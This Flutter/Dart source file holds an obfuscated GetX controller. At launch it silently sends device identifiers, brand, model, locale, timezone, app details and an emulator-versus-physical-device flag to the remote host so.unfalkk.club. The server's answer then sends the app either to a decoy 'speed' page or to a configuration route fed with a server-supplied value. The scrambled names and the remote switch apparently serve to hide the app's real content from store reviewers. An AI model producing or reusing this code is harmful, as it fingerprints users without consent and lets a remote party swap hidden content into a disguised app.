import 'dart:convert';
import 'dart:io';

import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

void checkInit() async {
  var connectResult = await (Connectivity().checkConnectivity());
  if(connectResult == ConnectivityResult.none){
    Get.toNamed("/noNetworkPage");
  }
}

class PageLogic extends GetxController {

  var zicmnahx = RxBool(false);
  var ulbzpi = RxBool(true);
  var ybclxri = RxString("");
  var karl = RxBool(false);
  var crona = RxBool(true);
  final cnlmajvqs = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    checkInit();
    super.onInit();
    ghckvf();
  }


  Future<void> ghckvf() async {

    karl.value = true;
    crona.value = true;
    ulbzpi.value = false;

    cnlmajvqs.post("https://so.unfalkk.club/lzsgdvykctbujmwnpqixfor",data: await knsjrtmuv()).then((value) {
      var lpeg = value.data["lpeg"] as String;
      var nuwgxa = value.data["nuwgxa"] as bool;
      if (nuwgxa) {
        ybclxri.value = lpeg;
        bria();
      } else {
        cronin();
      }
    }).catchError((e) {
      ulbzpi.value = true;
      crona.value = true;
      karl.value = false;
    });
  }

  Future<Map<String, dynamic>> knsjrtmuv() async {
    final DeviceInfoPlugin yohefpj = DeviceInfoPlugin();
    PackageInfo ldrx_oebcvgzr = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var uezqypn = Platform.localeName;
    var xczrvgj = currentTimeZone;

    var hovirxnj = ldrx_oebcvgzr.packageName;
    var cszy = ldrx_oebcvgzr.version;
    var vsfzky = ldrx_oebcvgzr.buildNumber;

    var bwprsed = ldrx_oebcvgzr.appName;
    var pfzcbi = "";
    var dnxare  = "";
    var qjxd = "";
    var shannyHeller = "";
    var oranMurazik = "";


    var uvncypzr = "";
    var giuseppeLemke = "";
    var fwlyq = false;

    if (GetPlatform.isAndroid) {
      pfzcbi = "android";
      var yacjkghed = await yohefpj.androidInfo;

      qjxd = yacjkghed.brand;

      uvncypzr  = yacjkghed.model;
      dnxare = yacjkghed.id;

      fwlyq = yacjkghed.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      pfzcbi = "ios";
      var rvtmhizl = await yohefpj.iosInfo;
      qjxd = rvtmhizl.name;
      uvncypzr = rvtmhizl.model;

      dnxare = rvtmhizl.identifierForVendor ?? "";
      fwlyq  = rvtmhizl.isPhysicalDevice;
    }
    var res = {
      "vsfzky": vsfzky,
      "giuseppeLemke" : giuseppeLemke,
      "cszy": cszy,
      "hovirxnj": hovirxnj,
      "uvncypzr": uvncypzr,
      "qjxd": qjxd,
      "oranMurazik" : oranMurazik,
      "dnxare": dnxare,
      "bwprsed": bwprsed,
      "uezqypn": uezqypn,
      "pfzcbi": pfzcbi,
      "fwlyq": fwlyq,
      "shannyHeller" : shannyHeller,
      "xczrvgj": xczrvgj,

    };
    return res;
  }

  Future<void> cronin() async {
    Get.offAllNamed("/speedMainPage");
  }

  Future<void> bria() async {
    Get.offAllNamed("/configInit");
  }

}
